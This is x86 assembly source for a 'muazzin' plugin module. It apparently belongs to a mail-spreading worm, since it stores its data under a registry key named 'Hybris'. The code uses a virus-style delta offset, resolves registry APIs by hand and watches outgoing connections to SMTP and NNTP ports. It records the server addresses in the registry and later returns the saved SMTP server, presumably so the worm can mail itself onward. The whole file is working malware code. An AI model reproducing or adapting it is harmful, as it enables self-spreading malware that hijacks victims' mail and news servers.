;Default muazzin - answer mail-related stuff

BITS 32

%include "\muazzin\muazzin.asi"
%include "\inc\reg.inc"

TYPE    EQU "serv"
VERSION EQU 0003h               ;0.03

entry:
       mov esi, [esp+4]
       test dword [esi+m_why], MT_BLOCKIP
       jnz .request
       test dword [esi+m_why], MT_QUERY
       jz near .exit0
  .query:
       mov esi, MT_QUERY+MT_BLOCKIP
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       ret 4

  .request:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       pushad
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       pushad
       lea eax, [ebp+kernel32]
       push eax
       call [ebp+getmhnd]
       lea ecx, [ebp+loadlib]
       push ecx
       push eax
       call [ebp+getpaddr]
       lea ecx, [ebp+advapi32]
       push ecx
       call eax
       mov [ebp+_advapi32], eax
       lea esi, [ebp+_apis]
       mov edi, esi
  .loop:
       lodsd
       test eax, eax
       jz .done1
       add eax, ebp
       push eax
       push dword [ebp+_advapi32]
       call [ebp+getpaddr]
       stosd
       jmp .loop
  .done1:
       popad
       mov ebx, [esi+m_ip]
       mov eax, [esi+m_port]
       mov ecx, ebx                             ;255.255.255.255
       inc ecx                                  ;trying to retrieve smtp addy?
       jecxz .load_smtp

       cmp ah, 77h            ;nntp
       je .save_nntp
       sub ah, 19h            ;smtp
       jnz near .exit
  .save_smtp:
       lea ecx, [ebp+keyname]
       jmp .do_reg_work
  .save_nntp:
       lea ecx, [ebp+keyname2]
  .do_reg_work:
       push byte 1
       call create_key
       push ebx
       mov eax, esp
       push byte 4
       push eax
       push dword REG_DWORD
       push byte 0
       push ecx
       push dword [ebp+hkey]
       call [ebp+RegSetValueExA]
       jmp .free_exit
  .load_smtp:
       push byte 0
       call create_key                          ;open
       lea edi, [ebp+keyname]
       xchg eax, edi
       push byte 4
       push esp
       push edi
       push byte 0
       push byte 0
       push eax
       push dword [ebp+hkey]
       call [ebp+RegQueryValueExA]
  .free_exit:
       pop ebx
       push dword [ebp+hkey]
       call [ebp+RegCloseKey]
       lea eax, [ebp+kernel32]
       push eax
       call [ebp+getmhnd]
       lea ecx, [ebp+freelib]
       push ecx
       push eax
       call [ebp+getpaddr]
       push dword [ebp+_advapi32]
       call eax
  .exit:
       popad
  .exit0:
       mov dword [esi+m_result], MR_OK
       ret 4

create_key:
       pushad
       sub esi, esi
       lea eax, [ebp+result]
       lea ebx, [ebp+hkey]
       lea edx, [ebp+regplace]
       mov ecx, [esp+(8*4)+4]
       jecxz .open
       push eax
       push ebx                 ;result
       push esi
       push dword KEY_ALL_ACCESS
       push dword REG_OPTION_NON_VOLATILE
       push esi                                 ;class
       push esi
       push edx
       push dword HKEY_CURRENT_USER
       call [ebp+RegCreateKeyExA]
       jmp .done
  .open:
       push ebx
       push dword KEY_ALL_ACCESS
       push esi
       push edx
       push dword HKEY_CURRENT_USER
       call [ebp+RegOpenKeyExA]
  .done:
       popad
       ret 4

regplace db "Software\Microsoft\Windows\CurrentVersion\Controls Folder\Hybris",0
keyname  db "SMTP Server",0
keyname2 db "NNTP Server",0

kernel32        db "KERNEL32.DLL", 0
advapi32        db "ADVAPI32.DLL", 0

loadlib         db "LoadLibraryA", 0
freelib         db "FreeLibrary", 0
api000          db "RegOpenKeyExA", 0
api001          db "RegCreateKeyExA", 0
api002          db "RegCloseKey", 0
api003          db "RegSetValueExA", 0
api004          db "RegQueryValueExA", 0

_apis:
RegOpenKeyExA    dd api000
RegCreateKeyExA  dd api001
RegCloseKey      dd api002
RegSetValueExA   dd api003
RegQueryValueExA dd api004
                 dd 0

_advapi32       dd 0
getpaddr        dd 0
getmhnd         dd 0

hkey            dd 0
keyvalue        dd 0
result          dd 0

